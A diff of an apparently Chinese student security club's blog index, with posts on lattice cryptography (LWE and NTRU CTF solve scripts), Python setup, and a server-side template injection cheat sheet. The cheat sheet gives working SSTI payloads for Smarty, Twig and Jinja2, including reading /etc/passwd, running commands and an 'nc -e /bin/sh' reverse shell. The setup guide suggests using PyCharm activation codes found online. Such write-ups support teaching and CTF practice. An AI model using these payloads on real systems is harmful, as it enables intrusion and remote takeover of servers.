-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">prime = <span class="number">2141</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(flag)</span><br><span class="line">flag = <span class="built_in">map</span>(<span class="built_in">ord</span>, flag)</span><br><span class="line">flag1 = flag[:<span class="number">21</span>]</span><br><span class="line">flag2 = flag[<span class="number">21</span>:]</span><br><span class="line">row = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">msg1, msg2</span>):</span><br><span class="line">    <span class="keyword">return</span> [(x + y) % prime <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(msg1, msg2)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multi</span>(<span class="params">msg1, msg2</span>):</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> msg1:</span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(l, msg2):</span><br><span class="line">            s += (x * y) % prime</span><br><span class="line">            s %= prime</span><br><span class="line">        out.append(s)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genkey</span>(<span class="params">leng</span>):</span><br><span class="line">    l = [[] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row)]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(row):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(leng):</span><br><span class="line">            l[x].append(random.randint(<span class="number">0</span>, <span class="number">511</span>))</span><br><span class="line">    <span class="keyword">return</span> l</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = genkey(<span class="built_in">len</span>(flag1))</span><br><span class="line"><span class="built_in">print</span> key</span><br><span class="line"></span><br><span class="line">cipher1 = multi(key, flag1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> cipher1</span><br><span class="line"></span><br><span class="line">cipher2 = multi(key, flag2)</span><br><span class="line"></span><br><span class="line">noise = [random.randint(<span class="number">0</span>, <span class="number">6</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row)]</span><br><span class="line"><span class="built_in">print</span> add(noise, cipher2)</span><br></pre></td></tr></table></figure>
-<p>flag的前半部分为普通的矩阵相乘，后半部分在矩阵相乘的基础上加入了噪音。</p>
-<p>首先如果噪音是0的话，相乘出的结果就是L上的一个格点。现在加入了噪音，我们得到的就是某个格点附近的向量。这时，我们只需要求解CVP问题即可求解LWE问题。同时，CVP问题可以被规约到SIVP问题上，也就是说LWE问题的困难度是基于最坏情况的SIVP困难度的。</p>
-<p>给出解密脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage脚本 LWE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sage.modules.free_module_integer <span class="keyword">import</span> IntegerLattice</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> starmap</span><br><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> mul</span><br><span class="line"></span><br><span class="line">key = </span><br><span class="line">p=<span class="number">2141</span></span><br><span class="line">b=</span><br><span class="line">A=Matrix(Zmod(p),key)</span><br><span class="line"><span class="built_in">print</span>(A.solve_right(b))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">closest_vector</span>(<span class="params">M, G, target</span>):</span><br><span class="line">    small = target</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(M.nrows())):</span><br><span class="line">            c = ((small * G[i]) / (G[i] * G[i])).<span class="built_in">round</span>()</span><br><span class="line">            small -= M[i] * c</span><br><span class="line">    <span class="keyword">return</span> target - small</span><br><span class="line"></span><br><span class="line">m = <span class="number">64</span></span><br><span class="line">n = <span class="number">21</span></span><br><span class="line">q = <span class="number">2141</span></span><br><span class="line"></span><br><span class="line">A_values = </span><br><span class="line"></span><br><span class="line">b_values = </span><br><span class="line">A = matrix(ZZ, m + n, m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    A[i, i] = q</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        A[m + y, x] = A_values[x][y]</span><br><span class="line">lattice = IntegerLattice(A, lll_reduce=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;LLL done&quot;</span>)</span><br><span class="line">gram = lattice.reduced_basis.gram_schmidt()[<span class="number">0</span>]</span><br><span class="line">target = vector(ZZ, b_values)</span><br><span class="line">res = closest_vector(lattice.reduced_basis, gram, target)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Closest Vector: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(res))</span><br><span class="line"></span><br><span class="line">R = IntegerModRing(q)</span><br><span class="line">M = Matrix(R, A_values)</span><br><span class="line">ingredients = M.solve_right(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Ingredients: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(ingredients))</span><br></pre></td></tr></table></figure>
-<h2 id="ntru加密">NTRU加密</h2>
-<p>NTRU的本质就是SVP问题。实际上，LLL算法及其变种算法是目前已知在较低维度的lattice中求解SVP的最好的算法，但是在较高维度中就比较乏力。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">d = <span class="number">1888131080991802984469142252767428996708357845414525789382920257253450734136628648374571804259719424143388465346476293366644738737089607039465127514487405</span></span><br><span class="line">p = <span class="number">30611187447617951438057661643828594439836168499045103637492727875883545693704706710809270955729333435251594169116242188128775616562859932991842965711916421973513501170770682029019363173114263880664543027598219327851802812372758784840490412167556903172872555298867886904331797406762790534760341763270179874103596315439602969532398796744300268959212967152977297923303435136058320818336169166426865495487391347983169818270302355278949814298699167819318471127268309841253880404251042151162557234493453591687370817297674493012095163546638810088146738185919186385185115618449986759562697777952684453338987559120695742612663</span></span><br><span class="line">h = <span class="number">21312401103364823065661625965265254047976261102113426643161584691333735528853578330462720782012571325209425607725450902072660790420041271498835143983658324491397948972480792470439905794590608772344151134928174674417907495690758864900707486731428987072095395641677518641643685295486795802883828831926635233976602465690044844008674887604376578289424972631509896184649710918327894604786477135136421222185152303050748164371324119467682895596417745201794158939881061666663709040766320031697689020600295103351632352583239176099726804730980876514993290370570966082812844360442005544939574202193639394320702060361753336559136</span></span><br><span class="line">c = <span class="number">16940539604003327722979410435578617956215682038759397881493708848549559668095838737615772551889674113155566943460688615187510308352387746131182860772735244685105354949311113745596385193812888514879929848085807780411336350803009420541916609478955298130063431885517727744668841197297817243205861167004168641880226875601283896199831113765890902106375084917385016349416483298441391462272070565319424930392336694536562067484570233782710064495559877940944602837436374378241977922432719824129042239016560841938886647111460591440853620154778487323813228157104022518913321245126759601657046000849672318847957185592562785436558</span></span><br><span class="line"></span><br><span class="line">m = matrix(ZZ, [[<span class="number">1</span>, h], [<span class="number">0</span>, p]])</span><br><span class="line">f, g = m.LLL()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(f, g)</span><br><span class="line">a = f*c % p % g</span><br><span class="line">m = a * inverse_mod(f, g) % g</span><br><span class="line"><span class="keyword">assert</span> m == d</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
-<p>在格基[1,h]和[0,p]上，[f,g]是其中的最短向量。通过LLL算法求解出f,g后，通过一系列计算可得m。</p>
-]]></content>
-      <categories>
-        <category>Crypto</category>
-      </categories>
-      <tags>
-        <tag>格</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>第一次例会-python基础</title>
     <url>/2022/09/29/%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%BE%8B%E4%BC%9A-python%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<h1 id="python基础">python基础</h1>
@@ -451,6 +339,84 @@ B=(k_1k_2N,k_2(g+k_1s)M_1,g(k_1-k_2)M_2,(g+k_1s)(g+k_2s))\\
       <categories>
         <category>例会</category>
       </categories>
+  </entry>
+  <entry>
+    <title>格密码</title>
+    <url>/2022/06/20/%E6%A0%BC%E5%AF%86%E7%A0%81/</url>
+    <content><![CDATA[<h1 id="格密码">格密码</h1>
+<p>一直想做一个整理，鸽了两个多月，考完试把之前鸽的补一下</p>
+<span id="more"></span>
+<h2 id="格中的困难问题">格中的困难问题</h2>
+<h3 id="svp最短向量问题">SVP：最短向量问题</h3>
+<p>给定一个基为B的Lattice L(B)，找到一个这个基构成的格点Bx:x，使得这个点距离0坐标点的距离最近。</p>
+<p>SVP的宽松版本：<img src="https://www.zhihu.com/equation?tex=SVP_%5Cgamma" alt="[公式]">，即找到一个基构成的格点Bx:x，使得这个店距离原点的距离小于最短距离的<img src="https://www.zhihu.com/equation?tex=%5Cgamma" alt="[公式]">倍即可。</p>
+<h3 id="cvp最近向量问题">CVP：最近向量问题</h3>
+<p>给定连续空间中任意的一个点t，找到距离这个点最近的格点Bx。</p>
+<p>同理可得，我们也可以得到CVP的宽松版，即<img src="https://www.zhihu.com/equation?tex=CVP_%5Cgamma" alt="[公式]">。</p>
+<h3 id="sivp最短独立向量问题">SIVP：最短独立向量问题</h3>
+<p>给定一个Lattice <img src="https://www.zhihu.com/equation?tex=%5Cmathcal%7BL%7D%28%5Cmathbf%7BB%7D%29" alt="[公式]">，找到<img src="https://www.zhihu.com/equation?tex=n" alt="[公式]">个线性独立的向量<img src="https://www.zhihu.com/equation?tex=%5Cmathbf%7BBx_1%2C+%5Cdots%2C+Bx_n%7D" alt="[公式]">并且这些向量的长度都要小于等于最长的最短向量<img src="https://www.zhihu.com/equation?tex=%5Clambda_n" alt="[公式]">。</p>
+<p>和SVP与CVP问题一样，我们也可以给出SIVP问题的宽松版定义，即<img src="https://www.zhihu.com/equation?tex=SIVP_%5Cgamma" alt="[公式]">。</p>
+<h2 id="基于lattice的信息传输">基于lattice的信息传输</h2>
+<p>首先，我们把需要传输的消息映射到Lattice中的一个点上，即Bx，然后把L和Bx发送出去。因为噪音，Bx会在L上产生偏移，首先我们需要求解SVP问题，寻找到L上的最短向量，并让其与噪音相比较，观察能否恢复出明文。然后若想恢复出明文，需要解决CVP问题，找到被噪声影响的密文的最近格点，一般来说就是映射到格上的明文。</p>
+<h2 id="lll算法">LLL算法</h2>
+<p>施密特正交化可以让一组坏基变成一组垂直的好基，而LLL算法可以找到在正交化的基础上最短或者近似最短的正交基。</p>
+<h2 id="lwe问题错误学习">LWE问题：错误学习</h2>
+<p>先放一道题</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">prime = <span class="number">2141</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(flag)</span><br><span class="line">flag = <span class="built_in">map</span>(<span class="built_in">ord</span>, flag)</span><br><span class="line">flag1 = flag[:<span class="number">21</span>]</span><br><span class="line">flag2 = flag[<span class="number">21</span>:]</span><br><span class="line">row = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">msg1, msg2</span>):</span><br><span class="line">    <span class="keyword">return</span> [(x + y) % prime <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(msg1, msg2)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multi</span>(<span class="params">msg1, msg2</span>):</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> msg1:</span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(l, msg2):</span><br><span class="line">            s += (x * y) % prime</span><br><span class="line">            s %= prime</span><br><span class="line">        out.append(s)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genkey</span>(<span class="params">leng</span>):</span><br><span class="line">    l = [[] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row)]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(row):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(leng):</span><br><span class="line">            l[x].append(random.randint(<span class="number">0</span>, <span class="number">511</span>))</span><br><span class="line">    <span class="keyword">return</span> l</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = genkey(<span class="built_in">len</span>(flag1))</span><br><span class="line"><span class="built_in">print</span> key</span><br><span class="line"></span><br><span class="line">cipher1 = multi(key, flag1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> cipher1</span><br><span class="line"></span><br><span class="line">cipher2 = multi(key, flag2)</span><br><span class="line"></span><br><span class="line">noise = [random.randint(<span class="number">0</span>, <span class="number">6</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row)]</span><br><span class="line"><span class="built_in">print</span> add(noise, cipher2)</span><br></pre></td></tr></table></figure>
+<p>flag的前半部分为普通的矩阵相乘，后半部分在矩阵相乘的基础上加入了噪音。</p>
+<p>首先如果噪音是0的话，相乘出的结果就是L上的一个格点。现在加入了噪音，我们得到的就是某个格点附近的向量。这时，我们只需要求解CVP问题即可求解LWE问题。同时，CVP问题可以被规约到SIVP问题上，也就是说LWE问题的困难度是基于最坏情况的SIVP困难度的。</p>
+<p>给出解密脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage脚本 LWE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sage.modules.free_module_integer <span class="keyword">import</span> IntegerLattice</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> starmap</span><br><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> mul</span><br><span class="line"></span><br><span class="line">key = </span><br><span class="line">p=<span class="number">2141</span></span><br><span class="line">b=</span><br><span class="line">A=Matrix(Zmod(p),key)</span><br><span class="line"><span class="built_in">print</span>(A.solve_right(b))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">closest_vector</span>(<span class="params">M, G, target</span>):</span><br><span class="line">    small = target</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(M.nrows())):</span><br><span class="line">            c = ((small * G[i]) / (G[i] * G[i])).<span class="built_in">round</span>()</span><br><span class="line">            small -= M[i] * c</span><br><span class="line">    <span class="keyword">return</span> target - small</span><br><span class="line"></span><br><span class="line">m = <span class="number">64</span></span><br><span class="line">n = <span class="number">21</span></span><br><span class="line">q = <span class="number">2141</span></span><br><span class="line"></span><br><span class="line">A_values = </span><br><span class="line"></span><br><span class="line">b_values = </span><br><span class="line">A = matrix(ZZ, m + n, m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    A[i, i] = q</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        A[m + y, x] = A_values[x][y]</span><br><span class="line">lattice = IntegerLattice(A, lll_reduce=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;LLL done&quot;</span>)</span><br><span class="line">gram = lattice.reduced_basis.gram_schmidt()[<span class="number">0</span>]</span><br><span class="line">target = vector(ZZ, b_values)</span><br><span class="line">res = closest_vector(lattice.reduced_basis, gram, target)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Closest Vector: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(res))</span><br><span class="line"></span><br><span class="line">R = IntegerModRing(q)</span><br><span class="line">M = Matrix(R, A_values)</span><br><span class="line">ingredients = M.solve_right(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Ingredients: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(ingredients))</span><br></pre></td></tr></table></figure>
+<h2 id="ntru加密">NTRU加密</h2>
+<p>NTRU的本质就是SVP问题。实际上，LLL算法及其变种算法是目前已知在较低维度的lattice中求解SVP的最好的算法，但是在较高维度中就比较乏力。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">d = <span class="number">1888131080991802984469142252767428996708357845414525789382920257253450734136628648374571804259719424143388465346476293366644738737089607039465127514487405</span></span><br><span class="line">p = <span class="number">30611187447617951438057661643828594439836168499045103637492727875883545693704706710809270955729333435251594169116242188128775616562859932991842965711916421973513501170770682029019363173114263880664543027598219327851802812372758784840490412167556903172872555298867886904331797406762790534760341763270179874103596315439602969532398796744300268959212967152977297923303435136058320818336169166426865495487391347983169818270302355278949814298699167819318471127268309841253880404251042151162557234493453591687370817297674493012095163546638810088146738185919186385185115618449986759562697777952684453338987559120695742612663</span></span><br><span class="line">h = <span class="number">21312401103364823065661625965265254047976261102113426643161584691333735528853578330462720782012571325209425607725450902072660790420041271498835143983658324491397948972480792470439905794590608772344151134928174674417907495690758864900707486731428987072095395641677518641643685295486795802883828831926635233976602465690044844008674887604376578289424972631509896184649710918327894604786477135136421222185152303050748164371324119467682895596417745201794158939881061666663709040766320031697689020600295103351632352583239176099726804730980876514993290370570966082812844360442005544939574202193639394320702060361753336559136</span></span><br><span class="line">c = <span class="number">16940539604003327722979410435578617956215682038759397881493708848549559668095838737615772551889674113155566943460688615187510308352387746131182860772735244685105354949311113745596385193812888514879929848085807780411336350803009420541916609478955298130063431885517727744668841197297817243205861167004168641880226875601283896199831113765890902106375084917385016349416483298441391462272070565319424930392336694536562067484570233782710064495559877940944602837436374378241977922432719824129042239016560841938886647111460591440853620154778487323813228157104022518913321245126759601657046000849672318847957185592562785436558</span></span><br><span class="line"></span><br><span class="line">m = matrix(ZZ, [[<span class="number">1</span>, h], [<span class="number">0</span>, p]])</span><br><span class="line">f, g = m.LLL()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(f, g)</span><br><span class="line">a = f*c % p % g</span><br><span class="line">m = a * inverse_mod(f, g) % g</span><br><span class="line"><span class="keyword">assert</span> m == d</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
+<p>在格基[1,h]和[0,p]上，[f,g]是其中的最短向量。通过LLL算法求解出f,g后，通过一系列计算可得m。</p>
+]]></content>
+      <categories>
+        <category>Crypto</category>
+      </categories>
+      <tags>
+        <tag>格</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SSTI模版注入</title>
+    <url>/2022/07/07/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="ssti">SSTI</h1>
+<h2 id="ssti判断">SSTI判断</h2>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="number">7</span>+<span class="number">7</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>输入会回显，判断回显值。</p>
+<span id="more"></span>
+<h2 id="常用的模版引擎">常用的模版引擎</h2>
+<h3 id="smarty">smarty</h3>
+<p>Smarty支持使用{php}{/php}标签来执行被包裹其中的php指令，但是在Smarty 3.1，{php}仅在SmartyBC中可用。</p>
+<p>{literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</p>
+<p>在PHP5即可使用</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="title function_ invoke__">phpinfo</span>();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>静态方法：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="built_in">self</span>::<span class="title function_ invoke__">getStreamVariable</span>(<span class="string">&quot;file:///etc/passwd&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
+<p>在3.1.30的Smarty版本中官方已经把该静态方法删除。利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</p>
+<p>if头：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">phpinfo</span>()&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="twig">twig</h3>
+<p>相比于 Smarty ,Twig 无法调用静态方法，并且所有函数的返回值都转换为字符串，也就是我们不能使用 <code>self::</code> 调用静态变量了。</p>
+49
+<p>会输出49.</p>
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.<span class="title function_ invoke__">registerUndefinedFilterCallback</span>(<span class="string">&quot;exec&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.<span class="title function_ invoke__">getFilter</span>(<span class="string">&quot;cat /flag&quot;</span>)&#125;&#125; <span class="comment"># 执行任意指令</span></span><br></pre></td></tr></table></figure>
+<h3 id="flaskjinja2">flask/jinja2</h3>
+49
+<p>会输出7777777.</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/tmp/evil&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;from os import system%0aSHELL = system&#x27;</span>) &#125;&#125;</span><br><span class="line">//写文件</span><br><span class="line">&#123;&#123; config.from_pyfile(<span class="string">&#x27;/tmp/evil&#x27;</span>) &#125;&#125;</span><br><span class="line">//加载system</span><br><span class="line">&#123;&#123; config[<span class="string">&#x27;SHELL&#x27;</span>](<span class="string">&#x27;nc xxxx xx -e /bin/sh&#x27;</span>) &#125;&#125;</span><br><span class="line">//执行命令反弹SHELL</span><br><span class="line">payload:?name=&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="tornado">tornado</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">117.78</span><span class="number">.26</span><span class="number">.79</span>:<span class="number">31093</span>/error?msg=&#123;&#123;handler.settings&#125;&#125; <span class="comment">#获取环境变量，即可获得cookie</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+      <tags>
+        <tag>注入</tag>
+      </tags>
   </entry>
   <entry>
     <title>第三次例会-密码学入门</title>
@@ -537,6 +503,40 @@ RSA加密算法：随机选择两个大素数p和q，计算n=p*q以及phi=(p-1)*
       <categories>
         <category>Crypto</category>
       </categories>
+  </entry>
+  <entry>
+    <title>python环境配置</title>
+    <url>/2022/09/27/python%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<h2 id="安装anaconda">1.安装anaconda</h2>
+<p>首先去<a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/">镜像站</a>下载anaconda的镜像</p>
+<p><img src="https://s2.loli.net/2022/09/27/47ldkv5GrE2PFDX.png"></p>
+<span id="more"></span>
+<p>安装anaconda</p>
+<p><img src="https://s2.loli.net/2022/09/27/C3b1p9ikwUmAfzY.png"></p>
+<p>第一个必选，第二个会在电脑装一个python3.7，如果没有python环境勾选</p>
+<h2 id="安装pycharm">2.安装pycharm</h2>
+<p>去<a href="https://www.jetbrains.com/zh-cn/pycharm/download/#section=windows">官网</a>下载pycharm专业版，在网上有几率可以找到可用的激活码，或者可以去jetbrain的官网进行<a href="https://www.jetbrains.com/shop/eform/students">学生认证</a>.</p>
+<p><img src="https://s2.loli.net/2022/09/27/hquUvejQmnFRENG.png"></p>
+<p>1和3都是可选，1是在桌面创建快捷方式，3是在右键菜单创建打开方式</p>
+<p>打开后可以在<img src="https://s2.loli.net/2022/09/27/NdHJ89pzf3hTIs4.png"></p>
+<p>登录有学生优惠的账号，也可以在<img src="https://s2.loli.net/2022/09/27/QhaFLuIWmsGonkj.png"></p>
+<p>输入网上找的可用的激活码。</p>
+<p>新建一个项目</p>
+<p><img src="https://s2.loli.net/2022/09/27/CBk72cvTs4UGPIj.png"></p>
+<p><img src="https://s2.loli.net/2022/09/27/a7OE9GoWF3M41w6.png"></p>
+<p><img src="https://s2.loli.net/2022/09/27/7q1YoTiPVEk8p64.png"></p>
+<p>选择Anaconda下的python.exe文件</p>
+<p>可以运行即可</p>
+<p><img src="https://s2.loli.net/2022/09/27/SJuLzUbTZNF3Iaw.png"></p>
+<p>然后用pip安装常用包</p>
+<p>在cmd中输入</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m pip install --upgrade pip</span><br></pre></td></tr></table></figure>
+<p>升级pip版本，然后输入</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pycryptodome</span><br></pre></td></tr></table></figure>
+<p>和</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure>
+<p>安装密码需要的Crypto库和pwn需要的pwntools。</p>
+]]></content>
   </entry>
   <entry>
     <title>螺丝网安工作室第二次例会：RSA</title>
